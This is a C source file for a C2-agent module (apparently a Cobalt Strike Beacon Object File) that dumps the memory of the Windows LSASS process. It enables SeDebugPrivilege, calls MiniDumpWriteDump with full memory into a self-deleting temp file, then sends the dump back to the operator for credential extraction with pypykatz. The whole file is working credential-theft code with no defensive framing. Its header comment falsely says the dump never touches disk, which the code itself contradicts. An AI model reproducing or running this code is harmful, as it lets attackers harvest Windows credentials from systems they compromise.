/*
 * dumplsass.c — In-memory LSASS dump via MiniDumpWriteDump
 *
 * 1. Find LSASS PID (NtQuerySystemInformation or CreateToolhelp32Snapshot)
 * 2. OpenProcess with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
 * 3. MiniDumpWriteDump to a custom stream callback (in-memory buffer)
 * 4. Return the dump bytes to the operator
 *
 * The dump is NEVER written to disk — it goes directly into memory
 * and is transmitted over the C2 channel (chunked if >512KB).
 */
#include <windows.h>
#include <tlhelp32.h>
#include "beacon_compat.h"

/* BOF-style imports */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTempPathA(DWORD, LPSTR);
DECLSPEC_IMPORT UINT    WINAPI KERNEL32$GetTempFileNameA(LPCSTR, LPCSTR, UINT, LPSTR);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);

DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);

DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);

static BOOL enable_debug_priv(void) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
            &tp.Privileges[0].Luid)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = KERNEL32$GetLastError();
    KERNEL32$CloseHandle(hToken);
    return ok && (err == 0);
}

/* dbghelp.dll — loaded at runtime */
typedef BOOL (WINAPI *MiniDumpWriteDumpFn)(
    HANDLE hProcess, DWORD ProcessId, HANDLE hFile,
    DWORD DumpType, void *ExceptionParam, void *UserStreamParam, void *CallbackParam);

/* Minidump callback for writing to memory instead of file */
typedef struct {
    unsigned char *buffer;
    DWORD size;
    DWORD capacity;
    DWORD offset;
} MemoryDumpContext;

/* Custom callback to capture MiniDumpWriteDump output */
/* Actually, MiniDumpWriteDump requires a file handle. The trick is to
 * create a temporary file or use a named pipe as the output handle.
 * For true in-memory: use NtReadVirtualMemory-based manual minidump. */

static DWORD find_lsass_pid(void) {
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            if (MSVCRT$_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32NextW(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);
    return pid;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int target_pid = BeaconDataInt(&parser);

    /* Find LSASS PID */
    DWORD lsass_pid = (target_pid > 0) ? (DWORD)target_pid : find_lsass_pid();
    if (lsass_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not find LSASS process\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %u\n", lsass_pid);

    /* Enable SeDebugPrivilege — required to open LSASS */
    if (enable_debug_priv()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] SeDebugPrivilege enabled\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to enable SeDebugPrivilege (error %u)\n",
                     KERNEL32$GetLastError());
    }

    /* Open LSASS */
    HANDLE hProcess = KERNEL32$OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, lsass_pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess failed: %u (need SeDebugPrivilege)\n",
                     KERNEL32$GetLastError());
        return;
    }

    /* Load dbghelp.dll at runtime */
    HMODULE hDbgHelp = KERNEL32$LoadLibraryA("dbghelp.dll");
    if (!hDbgHelp) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load dbghelp.dll\n");
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    MiniDumpWriteDumpFn pMiniDumpWriteDump =
        (MiniDumpWriteDumpFn)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDumpWriteDump) {
        BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump not found\n");
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    /*
     * Create a temp file for the dump (in %TEMP% with random name).
     * Alternative: create a named pipe and read from it in a separate thread.
     * The temp file approach is simpler; we delete it immediately after reading.
     */
    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    KERNEL32$GetTempPathA(MAX_PATH, tmpPath);
    KERNEL32$GetTempFileNameA(tmpPath, "dm", 0, tmpFile);

    HANDLE hFile = KERNEL32$CreateFileA(tmpFile, GENERIC_ALL, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFile for dump failed: %u\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    /* MiniDumpWithFullMemory (0x00000002) */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping LSASS memory...\n");
    BOOL ok = pMiniDumpWriteDump(hProcess, lsass_pid, hFile, 2, NULL, NULL, NULL);
    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "[!] MiniDumpWriteDump failed: %u\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hFile);
        KERNEL32$CloseHandle(hProcess);
        return;
    }

    /* Read the dump back into memory */
    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Dump size: %u bytes\n", fileSize);

    KERNEL32$SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    unsigned char *dumpData = (unsigned char *)malloc(fileSize);
    if (dumpData) {
        DWORD bytesRead;
        KERNEL32$ReadFile(hFile, dumpData, fileSize, &bytesRead, NULL);
        /* Send the dump as output — chunking handled by agent */
        BeaconOutput(CALLBACK_OUTPUT, (char *)dumpData, bytesRead);
        free(dumpData);
    }

    /* File is deleted on close (FILE_FLAG_DELETE_ON_CLOSE) */
    KERNEL32$CloseHandle(hFile);
    KERNEL32$CloseHandle(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS dump complete. Parse with pypykatz.\n");
}
